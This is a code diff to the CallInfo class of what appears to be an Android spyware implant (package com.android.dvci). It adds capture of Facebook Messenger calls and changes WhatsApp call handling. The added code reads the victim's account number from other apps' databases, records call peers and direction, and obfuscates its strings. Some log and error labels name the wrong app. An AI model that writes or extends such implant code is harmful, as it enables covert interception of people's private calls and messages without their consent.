@@ -2,10 +2,13 @@ package com.android.dvci.module.call;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
+import com.android.dvci.module.chat.ChatFacebook;
 import com.android.dvci.module.chat.ChatSkype;
 import com.android.dvci.module.chat.ChatViber;
+import com.android.dvci.module.chat.ChatWeChat;
 import com.android.dvci.module.chat.ChatWhatsapp;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
 
 import java.util.Date;
@@ -181,7 +184,6 @@ public class CallInfo {
 			return ret;
 
 		}else if (this.programId == 0x014b) {
-
 			if (end) {
 				return true;
 			}
@@ -190,7 +192,7 @@ public class CallInfo {
 			String account = ChatWhatsapp.readMyPhoneNumber();
 			this.account = account;
 			this.delay = false;
-			this.realRate = false;
+			this.realRate = true;
 
 			if(account == null){
 				if (Cfg.DEBUG) {
@@ -198,14 +200,52 @@ public class CallInfo {
 					return false;
 				}
 			}
-			boolean ret = true;
+			boolean ret = false;
 				ret = ChatWhatsapp.getCurrentCall(this);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " WHATSAPP (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+					Check.log(TAG + " WECHAT (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
 				}
 
 			return ret;
+		}else if (this.programId == 0x014c) {
 
+			boolean ret = false;
+			this.processName = M.e("com.facebook.orca");
+			this.delay = true;
+			this.realRate = true;
+			if (end) {
+
+				// open DB
+
+				String account = ChatFacebook.getPhone_number();
+				if (StringUtils.isEmpty(account)) {
+					ChatFacebook.getAccountInfo();
+					account = ChatFacebook.getPhone_number();
+					if (StringUtils.isEmpty(account)) {
+						account = "fb local";
+					}
+				}
+				this.account = account;
+				if (account == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (update) ERROR, cannot read whatsapp account ");
+						return false;
+					}
+				}
+
+				ret = ChatFacebook.getCurrentCall(this);
+
+
+			} else {
+				this.account = M.e("delay");
+				this.peer = M.e("delay");
+				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " FACEBOOK (updateCallInfo): id: " + this.id + " peer: " + this.peer + " incoming=" + this.incoming + " returning:" + ret);
+			}
+
+			return ret;
 		}
 		return false;
 	}
